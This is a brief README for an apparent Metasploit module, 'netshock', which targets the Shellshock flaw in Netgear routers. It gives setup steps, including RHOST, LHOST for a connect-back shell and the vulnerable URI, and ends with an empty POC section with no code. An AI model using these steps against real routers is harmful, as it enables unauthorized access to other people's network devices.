# netshock
## About
This module utilzies the shellshock vulnerability on many home and enterprise netgear routers. <br />
I will not be supplying the vulnerable pages, just the module itself and payload. I have submitted this to the metasploit repo but we will see if it makes it in.. <br />
Cheers, and happy hacking... <br />
## Usage 
Copy the module into your metasploit directory, 

SET RHOST = {Vulnerable Netgear Infrastructure <br />
SET RPORT = {Port That vulnerable product is listening on  <br />
SET LHOST = {The IP For Connect Back}<br />
SET URI = {The Vulnerable Page}<br />
exploit -j <br />

### POC 



